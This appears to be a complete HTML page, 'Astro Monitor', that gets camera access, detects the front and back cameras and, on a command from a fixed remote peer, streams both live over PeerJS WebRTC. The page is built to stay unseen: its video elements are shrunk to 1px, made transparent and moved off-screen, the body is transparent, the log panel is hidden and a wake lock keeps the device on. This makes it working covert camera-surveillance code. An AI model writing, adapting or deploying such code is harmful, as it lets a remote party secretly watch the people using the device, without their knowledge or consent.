<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Astro Monitor - Dual Live Streaming</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: transparent;
            min-height: 0;
            padding: 0;
            margin: 0;
            overflow: hidden;
        }
        video {
            position: absolute;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
            top: -1000px;
            left: -1000px;
        }
        .debug {
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: rgba(0,0,0,0.9);
            color: #0f0;
            font-family: monospace;
            font-size: 10px;
            max-height: 120px;
            overflow-y: auto;
            z-index: 9999;
            display: none;
        }
    </style>
    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
</head>
<body>
    <video id="frontPreview" autoplay muted playsinline></video>
    <video id="backPreview" autoplay muted playsinline></video>
    <div class="debug" id="debug"></div>

    <script>
        const MY_ID = "BPrivate";
        const PARTNER_ID = "APrivate";
        
        let peer = null;
        let dataConn = null;
        let frontCall = null;
        let backCall = null;
        let frontStream = null;
        let backStream = null;
        let isActive = false;
        let wakeLock = null;
        
        let FRONT_CAMERA_ID = null;
        let BACK_CAMERA_ID = null;
        
        function log(msg) {
            console.log(`[MONITOR] ${msg}`);
            const debug = document.getElementById('debug');
            if (debug) {
                const div = document.createElement('div');
                div.textContent = new Date().toLocaleTimeString() + ' - ' + msg;
                debug.appendChild(div);
                debug.scrollTop = debug.scrollHeight;
                if (debug.children.length > 20) debug.removeChild(debug.children[0]);
            }
        }
        
        async function detectCameras() {
            try {
                await navigator.mediaDevices.getUserMedia({ video: true });
                
                const devices = await navigator.mediaDevices.enumerateDevices();
                const cameras = devices.filter(d => d.kind === "videoinput");
                
                log(`Found ${cameras.length} camera(s):`);
                cameras.forEach((cam, i) => {
                    log(`  [${i}] ${cam.label || 'Unnamed'}`);
                    
                    const label = cam.label.toLowerCase();
                    if (label.includes("back") || label.includes("rear") || label.includes("environment")) {
                        BACK_CAMERA_ID = cam.deviceId;
                        log(`  ✅ BACK camera identified`);
                    } else if (label.includes("front") || label.includes("user") || label.includes("face")) {
                        FRONT_CAMERA_ID = cam.deviceId;
                        log(`  ✅ FRONT camera identified`);
                    }
                });
                
                if (!BACK_CAMERA_ID && cameras[0]) {
                    BACK_CAMERA_ID = cameras[0].deviceId;
                    log(`  Using camera[0] as BACK`);
                }
                if (!FRONT_CAMERA_ID && cameras[1]) {
                    FRONT_CAMERA_ID = cameras[1].deviceId;
                    log(`  Using camera[1] as FRONT`);
                }
                
                return BACK_CAMERA_ID && FRONT_CAMERA_ID;
            } catch (err) {
                log(`Camera detection failed: ${err.message}`);
                return false;
            }
        }
        
        async function getLiveStream(camera, deviceId) {
            const isBack = (camera === 'back');
            
            // Try exact deviceId first
            if (deviceId) {
                try {
                    log(`Getting LIVE ${camera} with deviceId`);
                    const stream = await navigator.mediaDevices.getUserMedia({
                        audio: false,
                        video: {
                            deviceId: { exact: deviceId },
                            width: { ideal: 640 },
                            height: { ideal: 480 },
                            frameRate: { ideal: 30 }
                        }
                    });
                    log(`✅ LIVE ${camera} stream acquired`);
                    return stream;
                } catch (err) {
                    log(`deviceId failed: ${err.message}`);
                }
            }
            
            // Fallback to facingMode
            try {
                log(`Falling back to facingMode for LIVE ${camera}`);
                const stream = await navigator.mediaDevices.getUserMedia({
                    audio: false,
                    video: {
                        facingMode: { exact: isBack ? "environment" : "user" },
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        frameRate: { ideal: 30 }
                    }
                });
                log(`✅ LIVE ${camera} stream acquired via facingMode`);
                return stream;
            } catch (err) {
                log(`facingMode failed: ${err.message}`);
            }
            
            return null;
        }
        
        async function startBothLiveStreams() {
            if (isActive) {
                log('Already streaming both cameras');
                return;
            }
            
            log('====== STARTING DUAL LIVE STREAMS ======');
            
            try {
                // Get front camera stream
                log('Getting FRONT live stream...');
                frontStream = await getLiveStream('front', FRONT_CAMERA_ID);
                if (frontStream) {
                    document.getElementById('frontPreview').srcObject = frontStream;
                    log('✅ FRONT live stream ready');
                } else {
                    log('❌ Failed to get FRONT live stream');
                }
                
                // Get back camera stream
                log('Getting BACK live stream...');
                backStream = await getLiveStream('back', BACK_CAMERA_ID);
                if (backStream) {
                    document.getElementById('backPreview').srcObject = backStream;
                    log('✅ BACK live stream ready');
                } else {
                    log('❌ Failed to get BACK live stream');
                }
                
                if (frontStream && backStream) {
                    // Make calls to remote
                    log('Establishing WebRTC connections to remote...');
                    
                    frontCall = peer.call(PARTNER_ID, frontStream, { 
                        metadata: { camera: 'front', type: 'live' } 
                    });
                    
                    backCall = peer.call(PARTNER_ID, backStream, { 
                        metadata: { camera: 'back', type: 'live' } 
                    });
                    
                    isActive = true;
                    log('✅ BOTH LIVE STREAMS ACTIVE');
                    
                    if (dataConn) {
                        dataConn.send({ type: 'streams_active' });
                    }
                } else {
                    log('Failed to get both camera streams');
                    if (!frontStream) log('Front camera failed');
                    if (!backStream) log('Back camera failed');
                }
                
            } catch (err) {
                log(`Error: ${err.message}`);
            }
        }
        
        function stopBothLiveStreams() {
            log('Stopping both live streams...');
            
            if (frontCall) {
                frontCall.close();
                frontCall = null;
            }
            if (backCall) {
                backCall.close();
                backCall = null;
            }
            if (frontStream) {
                frontStream.getTracks().forEach(t => t.stop());
                frontStream = null;
            }
            if (backStream) {
                backStream.getTracks().forEach(t => t.stop());
                backStream = null;
            }
            document.getElementById('frontPreview').srcObject = null;
            document.getElementById('backPreview').srcObject = null;
            isActive = false;
        }
        
        async function preventScreenLock() {
            if ('wakeLock' in navigator) {
                try {
                    wakeLock = await navigator.wakeLock.request('screen');
                    log('Screen wake lock acquired');
                } catch (err) {}
            }
        }
        
        function handleDataMessage(data) {
            log(`Command: ${data.type}`);
            
            if (data.type === 'start_dual_stream') {
                log('Received START command from remote');
                startBothLiveStreams();
            } else if (data.type === 'stop_dual_stream') {
                stopBothLiveStreams();
            }
        }
        
        function initPeer() {
            if (peer) {
                peer.destroy();
                peer = null;
            }
            
            log(`Initializing monitor as ${MY_ID}`);
            peer = new Peer(MY_ID);
            
            peer.on('open', async () => {
                log(`✅ Monitor ACTIVE - ID: ${MY_ID}`);
                const camerasFound = await detectCameras();
                if (camerasFound) {
                    log(`Front camera ID: ${FRONT_CAMERA_ID?.substring(0, 20)}...`);
                    log(`Back camera ID: ${BACK_CAMERA_ID?.substring(0, 20)}...`);
                    log(`Ready for connection from ${PARTNER_ID}`);
                    log('Will stream BOTH cameras LIVE when requested');
                } else {
                    log('⚠️ Could not detect both cameras');
                }
            });
            
            peer.on('connection', (conn) => {
                if (conn.peer === PARTNER_ID) {
                    log(`📡 Remote connected`);
                    dataConn = conn;
                    conn.on('data', handleDataMessage);
                    conn.on('close', () => { 
                        log('Remote disconnected');
                        stopBothLiveStreams();
                        dataConn = null;
                    });
                } else {
                    conn.close();
                }
            });
            
            peer.on('error', (err) => {
                log(`Error: ${err.type}`);
                if (err.type === 'unavailable-id') {
                    setTimeout(() => initPeer(), 5000);
                }
            });
        }
        
        log('╔════════════════════════════════╗');
        log('║   ASTRO MONITOR - DUAL LIVE   ║');
        log('║   Front + Back Live Streams   ║');
        log('╚════════════════════════════════╝');
        
        preventScreenLock();
        initPeer();
        
        window.addEventListener('beforeunload', () => {
            stopBothLiveStreams();
            if (peer) peer.destroy();
            if (wakeLock) wakeLock.release();
        });
    </script>
</body>
</html>
